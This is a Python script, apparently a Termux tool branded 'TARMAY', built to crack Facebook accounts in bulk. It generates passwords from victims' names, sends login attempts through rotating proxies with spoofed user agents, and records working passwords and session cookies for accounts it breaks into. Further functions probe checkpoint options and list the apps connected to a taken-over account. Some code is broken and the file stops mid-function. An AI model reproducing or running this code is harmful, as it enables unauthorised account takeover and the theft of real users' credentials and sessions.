import requests,bs4,json,os,sys,random,datetime,time,re,platform
import urllib3,rich,base64
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
os.system('pkg install speak')
os.system('pkg install espeak')
os.system('espeak -a 300 " WELCOME TO TOOL TARMAY"')

from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import requests

cookies = {'datr': 'k730ZXkzPEpRK-aywx6Wcs2y',
    'sb': 'k730ZUSTrlFa65lJrh6mdyRG',
    'm_pixel_ratio': '2',
    'ps_l': '0',
    'ps_n': '0',
    'locale': 'cb_IQ',
    'wl_cbv': 'v2%3Bclient_version%3A2436%3Btimestamp%3A1710538147',
    'vpd': 'v1%3B662x360x2',
    'wd': '360x662',
    'fr': '0aNKNvDr3zg5cGjdH.AWW9xYy87c3dd_N6gQiy1wg4JZ0.Bl9L2T..AAA.0.0.Bl9L3N.AWXPwloq_z4',}

headers = {'authority': 'p.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ar-US;q=0.8,ar;q=0.7,fa-US;q=0.6,fa;q=0.5',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=k730ZXkzPEpRK-aywx6Wcs2y; sb=k730ZUSTrlFa65lJrh6mdyRG; m_pixel_ratio=2; ps_l=0; ps_n=0; locale=cb_IQ; wl_cbv=v2%3Bclient_version%3A2436%3Btimestamp%3A1710538147; vpd=v1%3B662x360x2; wd=360x662; fr=0aNKNvDr3zg5cGjdH.AWW9xYy87c3dd_N6gQiy1wg4JZ0.Bl9L2T..AAA.0.0.Bl9L3N.AWXPwloq_z4',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"STK-L21"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',}


params = {'stype': 'lo',
    'deoia': '1',
    'jlou': 'AfdUHsjJ2QFAmR93GjqjA9S65zuvahY8kNxD6lVPdRobhquvkIgk8WNiO1U0XBDpeez9fbDxl76GyL0xvis6ttZr6XN2OZkpY2A8hh_pQnZtVA',
    'smuh': '42703',
    'lh': 'Ac_wJI7NOhYHer0MAxM',}

data = {'lsd': 'AVqAhQPrMiI',
    'jazoest': '2963',
    'uid': '100076526146833',
    'flow': 'login_no_pin',
    'next': '',}

response = requests.get('https://p.facebook.com/', params=params, cookies=cookies, headers=headers)

import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()
#DATE AND TIME
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day

#USER-AGENTS
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;96mDynoXD')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
for t in range(10000):
	a=random.choice([
									"4",
									"5",
									"6",
									"7",
									"8",
									"9",
									"10",
									"11",
									"12",
									"13",
									"9.1.5",
									"5.1.6",
									"4.0.1",
									"3.0.1",
									"4.0.2",
									"5.0.2",
									"6.0.1",
									"6.2.2",
									"7.0.1",
									"7.1.0",
									"8.1.0",
									"4.4.4",
									"5.6.1",
									"6.1.3"
									])
	b=random.choice([
									'en-us',
									'en-gb',
									'id-id',
									'de-de',
									'ru-ru',
									'en-sg',
									'fr-fr',
									'fa-ir',
									'ja-jp',
									'pt-br',
									'cs-cz',
									'zh-hk',
									'zh-cn',
									'vi-vn',
									'en-ph',
									'en-in',
									'tr-tr'
									])
	c=random.choice([
									"Redmi 7",
									"Redmi Note 8",
									"Redmi 6A",
									"Mi 9 Lite",
									"Redmi Note 11 Pro",
									"Redmi 5A",
									"Mi 9 SE",
									"POCO M4 Pro",
									"POCO X3 Pro",
									"Redmi 5 Plus",
									"Redmi Note 10 Pro",
									"M2007J22G",
									"Redmi 9C NFC"
									])
	d=random.choice([
									'OPM1',
									'TP1A',
									'RP1A',
									'PPR1',
									'PKQ1',
									'QP1A',
									'SP1A',
									'RKQ1'
									])
	e=random.choice([
									'001',
									'002',
									'003',
									'004',
									'005',
									'006',
									'007',
									'008',
									'009',
									'010',
									'011',
									'012',
									'013',
									'014',
									'015',
									'016',
									'017',
									'018',
									'019',
									'020'
									])
	f=random.randrange(111111,199999)
	g=random.randrange(10,300)
	h=random.randrange(1111,9999)
	i=random.randrange(20,100)
	j=random.choice([
									"XiaoMi/MiuiBrowser/13.23.2-gn",
									"XiaoMi/MiuiBrowser/13.13.2-gn",
									"XiaoMi/MiuiBrowser/13.16.1-gn",
									"XiaoMi/MiuiBrowser/13.25.2.1-gn",
									"XiaoMi/MiuiBrowser/12.15.3-go",
									"XiaoMi/MiuiBrowser/13.29.0-gn",
									"XiaoMi/MiuiBrowser/13.28.0-gn",
									"XiaoMi/MiuiBrowser/12.7.5-go",
									"XiaoMi/MiuiBrowser/13.28.0-gn",
									"XiaoMi/MiuiBrowser/12.22.0.3-gn"
									])
	kondom1=f'Mozilla/5.0 (Linux; U; Android {a}; {b}; {c} Build/{d}.{f}.{e}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{g}.0.{h}.{i} Mobile Safari/537.36 {j}'
	kondom2=f'Mozilla/5.0 (Linux; U; Android {a}; {b}; {c}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{g}.0.{h}.{i} Mobile Safari/537.36 {j}'
	uaku2 = random.choice([kondom1,kondom2])
	ugen.append(uaku2)
	
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#COLOR-CODE
BM = '\x1b[1;97m'
P = '\x1b[1;91m'
M = '\x1b[1;97m'
H = '\x1b[1;97m'
K = '\x1b[1;96m'
B = '\x1b[1;93m'
U = '\x1b[1;96m' 
O = '\x1b[1;95m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;97m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[96m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;95m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])

def clear():
    os.system('clear')
    banner()
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "\x1b[1;91mPM"
else:
    a = ltx
    tag = "\x1b[1;96mAM"
#IPYTHONI
def _____DYNO_____(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:'2006-2007'			
	else:tahunz=''
	return tahunz
def clear():
	os.system('clear')
def back():
	login()
#LOGO
def banner():
	print("""%s


 ───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───
───█▒▒░░░░░░░░░▒▒█───
────█░░█░░░░░█░░█────
─▄▄──█░░░▀█▀░░░█──▄▄─
█░░█─▀▄░░░░░░░▄▀─█░░█
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
█░░║║║╠─║─║─║║║║║╠─░░█
█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
                         
------------------------------------------------------------------------                                                                   
 ╭━━━━┳━━━┳━━━┳━╮╭━┳━━━┳╮╱╱╭╮
 ┃╭╮╭╮┃╭━╮┃╭━╮┃┃╰╯┃┃╭━╮┃╰╮╭╯┃
 ╰╯┃┃╰┫┃╱┃┃╰━╯┃╭╮╭╮┃┃╱┃┣╮╰╯╭╯
 ╱╱┃┃╱┃╰━╯┃╭╮╭┫┃┃┃┃┃╰━╯┃╰╮╭╯
 ╱╱┃┃╱┃╭━╮┃┃┃╰┫┃┃┃┃┃╭━╮┃╱┃┃
 ╱╱╰╯╱╰╯╱╰┻╯╰━┻╯╰╯╰┻╯╱╰╯╱╰╯

TELEGRAM:@tarmay_shaw1
CHANAL : t.me/crack_tarmay
    ‌\033[96m𝑻𝑨𝑹𝑴𝑨𝒀 𝑽1
--------------------------------------------- 
                                                                   
              
"""%(P))
os.system('clear')
banner()
#MENU
def menu():
	
	print(f'\x1b[1;96m- 𝑪𝑹𝑨𝑪𝑲 𝑩𝑨 𝑭𝑰𝑳𝑬')
	_____DYNO_____ = input('\x1b[1;96mSELECT :\x1b[1;96m ')
	if _____DYNO_____ in ['1']:
		F()
		print(' \x1b[1;96m\x1b[1;96m\x1b[1;96m LogOut Successful ')
		exit()
	else:
		print(' \x1b[1;96m\x1b[1;96m\x1b[1;96m 𝑯𝑨𝑳𝑨𝒀𝑨 ')
		back()
def error():
	print(f' \x1b[1;96m\x1b[1;96m\x1b[1;96m \x1b[33mBgarewa Bo Menu')
	time.sleep(2)
	back()
#INPUT-FILE	
def F():
    os.system('clear');
    D().plerr()
    

class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		try:
			
			fileX = input ('\x1b[1;96m𝑵𝑨𝑴𝑬 𝑭𝑰𝑳𝑬 : ')
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f'\x1b[1;97m𝑯𝑨𝑴𝑼 𝑰𝑫𝑨𝑲𝑨𝑵 : \x1b[1;94m'+str(len(id)))
			Settings()
		except IOError:
			print(" \x1b[1;96m\x1b[1;96m\x1b[1;96m \x1b[1;96m file %s not found\x1b[0m"%(fileX));time.sleep(2)
			F()
#SERVER-SETTING			
def Settings():
	print('')
	print('\x1b[1;96m. 𝑩𝑨𝑺𝑯𝑻𝑹𝑬𝑵 𝑰𝑫𝑺 ')
	print('')
	hu = input('\x1b[1;97m𝑪𝒉𝒐𝒊𝒄𝒆 > \x1b[1;96m ')
	if hu in ['11','011']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['1','01']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('\x1b[1;96m\x1b[1;96m\x1b[1;96m\x1b[1;96m𝑯𝑨𝑳𝑨𝒀𝑨')
		exit()
	
	print('\x1b[1;96m. 𝑴𝑬𝑻𝑯𝑶𝑫𝑬 𝑴𝑶𝑩𝑰𝑳𝑬')
	print('')
	hc = input('\x1b[1;97m𝑪𝑯𝑶𝑰𝑪𝑬 > \x1b[1;96m')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus=input('\033[1;96m𝑨𝑼𝑻𝑶 𝑷𝑨𝑺𝑺 [ 𝑻 ] ')
	if pwplus in ['00','00']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] ENTER 6 CHARECTERS FOR CRACK PASS\n[[cyan]•[white]] LIKE --->[green] zaxo123,kurd123,hama1234[white] '))
		pwku=input('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mPassword > \x1b[1;93m')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit()
def passwrd():
	print(f"\x1b[1;93m------------------------------------------------------------")
	print(f"\x1b[1;97m[+] 𝑫𝑨𝑻𝑨 : \x1b[1;97m{ha}\x1b[1;97m/\x1b[1;97m{bu}\x1b[1;97m/\x1b[1;97m{ta} ")
	print(f"\x1b[1;93m------------------------------------------------------------")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+frs)
					pwv.append("zaxo123")
					pwv.append("zaxo1234")
					pwv.append("zaxo12345")
					pwv.append("zaxo123456")
					pwv.append("zaxo1234567")
					pwv.append("zaxo12345678")
					pwv.append("zaxo123456789")
					pwv.append("zaxo321")
					pwv.append("zaxo4321")
					pwv.append("zaxo54321")
					pwv.append("zaxo654321")
					pwv.append("zaxo7654321")
					pwv.append("zaxozaxo")
					pwv.append("zaxozaxo123")
					pwv.append("zaxozaxo1234")
					pwv.append("zaxozaxo12345")
					pwv.append("zaxozaxo1234567")
					pwv.append("zaxozaxo12345678")
					pwv.append("zaxozaxo123456789")
					pwv.append("zaxozaxo321")
					pwv.append("zaxozaxo4321")
					pwv.append("zaxozaxo54321")
					pwv.append("zaxozaxo654321")
					pwv.append("zaxozaxo7654321")
					pwv.append("zaxozaxo87654321")
					pwv.append("zaxozaxo987654321")
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'123321')
					pwv.append(frs+'12344321')
					pwv.append(frs+'1234554321')
					pwv.append(frs+'1221')
					pwv.append(frs+'1122')
					pwv.append(frs+'112233')
					pwv.append(frs+'11223344')
					pwv.append(frs+'1122334455')
					pwv.append(frs+'0750')
					pwv.append(frs+'2005')
					pwv.append(frs+'2004')
					pwv.append(frs+'2003')
					pwv.append(frs+'2002')
					pwv.append(frs+'2001')
					pwv.append(frs+'2000')
					pwv.append(frs+'1999')
					pwv.append(frs+"1988")
					pwv.append(frs+"1989")
					pwv.append(frs+"1990")
					pwv.append(frs+"1991")
					pwv.append(frs+"1992")
					pwv.append(frs+"1993")
					pwv.append(frs+"1994")
					pwv.append(frs+"1995")
					pwv.append(frs+"1994")
					pwv.append(frs+"1993")
					pwv.append(frs+"1992")
					pwv.append(frs+"1991")
					pwv.append(frs+"1990")
					pwv.append(frs+"1989")
					pwv.append(frs+"1988")
					pwv.append(frs+"1987")
					pwv.append(frs+"1986")
					pwv.append(frs+"1985")
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+frs)
					pwv.append("zaxo123")
					pwv.append("zaxo1234")
					pwv.append("zaxo12345")
					pwv.append("zaxo123456")
					pwv.append("zaxo1234567")
					pwv.append("zaxo12345678")
					pwv.append("zaxo123456789")
					pwv.append("zaxo321")
					pwv.append("zaxo4321")
					pwv.append("zaxo54321")
					pwv.append("zaxo654321")
					pwv.append("zaxo7654321")
					pwv.append("zaxozaxo")
					pwv.append("zaxozaxo123")
					pwv.append("zaxozaxo1234")
					pwv.append("zaxozaxo12345")
					pwv.append("zaxozaxo1234567")
					pwv.append("zaxozaxo12345678")
					pwv.append("zaxozaxo123456789")
					pwv.append("zaxozaxo321")
					pwv.append("zaxozaxo4321")
					pwv.append("zaxozaxo54321")
					pwv.append("zaxozaxo654321")
					pwv.append("zaxozaxo7654321")
					pwv.append("zaxozaxo87654321")
					pwv.append("zaxozaxo987654321")
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'123321')
					pwv.append(frs+'12344321')
					pwv.append(frs+'1234554321')
					pwv.append(frs+'1221')
					pwv.append(frs+'1122')
					pwv.append(frs+'112233')
					pwv.append(frs+'11223344')
					pwv.append(frs+'1122334455')
					pwv.append(frs+'0750')
					pwv.append(frs+'2005')
					pwv.append(frs+'2004')
					pwv.append(frs+'2003')
					pwv.append(frs+'2002')
					pwv.append(frs+'2001')
					pwv.append(frs+'2000')
					pwv.append(frs+'1999')
					pwv.append(frs+"1988")
					pwv.append(frs+"1989")
					pwv.append(frs+"1990")
					pwv.append(frs+"1991")
					pwv.append(frs+"1992")
					pwv.append(frs+"1993")
					pwv.append(frs+"1994")
					pwv.append(frs+"1995")
					pwv.append(frs+"1994")
					pwv.append(frs+"1993")
					pwv.append(frs+"1992")
					pwv.append(frs+"1991")
					pwv.append(frs+"1990")
					pwv.append(frs+"1989")
					pwv.append(frs+"1988")
					pwv.append(frs+"1987")
					pwv.append(frs+"1986")
					pwv.append(frs+"1985")
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;97m 𝑪𝑹𝑨𝑪𝑲 𝑪𝑶𝑴𝑷𝑳𝑬𝑻𝑬')
	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;97m 𝑶𝑲 : {h}%s '%(ok))
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m  𝑹𝑬𝑻𝑼𝑹𝑵 𝑪𝑹𝑨𝑪𝑲 \x1b[1;97m[Y]\n \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91mEXIT [𝑻]')
	woi = input('\x1b[1;97m 𝑺𝑬𝑳𝑬𝑪𝑻  : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t \x1b[1;91m\x1b[1;96m\x1b[1;97m BYE {u} ')
		time.sleep(2)
		exit()

def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([P,h,Z,N,O,U])
	sys.stdout.write(f"\r  𝑻𝑨R𝑴𝑨𝒀💀✔️  {P}{b}{loop}{P}•{b}{len(id)}{P}  • 𝑶𝑲:{P}{H}{ok}{P} •  𝑪𝑷:{P}{M}{cp}{P} • ({bo}{'{:.0%})'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
		
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'authority': 'p.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ar-US;q=0.8,ar;q=0.7,fa-US;q=0.6,fa;q=0.5',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=k730ZXkzPEpRK-aywx6Wcs2y; sb=k730ZUSTrlFa65lJrh6mdyRG; m_pixel_ratio=2; ps_l=0; ps_n=0; locale=cb_IQ; wl_cbv=v2%3Bclient_version%3A2436%3Btimestamp%3A1710538147; vpd=v1%3B662x360x2; wd=360x662; fr=0aNKNvDr3zg5cGjdH.AWW9xYy87c3dd_N6gQiy1wg4JZ0.Bl9L2T..AAA.0.0.Bl9L3N.AWXPwloq_z4',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"STK-L21"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',}
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":{'authority': 'p.facebook.com''accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ar-US;q=0.8,ar;q=0.7,fa-US;q=0.6,fa;q=0.5',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=k730ZXkzPEpRK-aywx6Wcs2y; sb=k730ZUSTrlFa65lJrh6mdyRG; m_pixel_ratio=2; ps_l=0; ps_n=0; locale=cb_IQ; wl_cbv=v2%3Bclient_version%3A2436%3Btimestamp%3A1710538147; vpd=v1%3B662x360x2; wd=360x662; fr=0aNKNvDr3zg5cGjdH.AWW9xYy87c3dd_N6gQiy1wg4JZ0.Bl9L2T..AAA.0.0.Bl9L3N.AWXPwloq_z4',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"STK-L21"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\n\x1b[1;93m 𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲: \x1b[1;93m{tahun(idf)}{P} \n\x1b[1;93m 𝑼𝑺𝑬𝑹𝑵𝑨𝑴𝑬: \x1b[1;93m{idf}\n\x1b[1;93m 𝑷𝑨𝑺𝑺𝑾𝑶𝑹𝑫: \x1b[1;93m{pw}')
				open('𝑪𝑷/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'\n\x1b[1;92m 𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲 ✓: \x1b[1;92m{tahun(idf)} \n\x1b[1;92m 𝑼𝑺𝑬𝑹𝑵𝑨𝑴𝑬 ✓: \x1b[1;92m{idf}\n\x1b[1;92m 𝑷𝑨𝑺𝑺𝑾𝑶𝑹𝑫 ✓: \x1b[1;92m{pw}')
				open('𝑶𝑲/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_Tarmay(kuki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> 𝑪𝑷       %s'%(b,idf,pw,x))
		open('𝑪𝑷/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Check  Login Id Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> 𝑪𝑷       %s'%(b,idf,pw,x))
		print('\r%s---> Cannot Check Options (Check Login In Lite/Basic)%s'%(u,x))
		open('𝑪𝑷/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
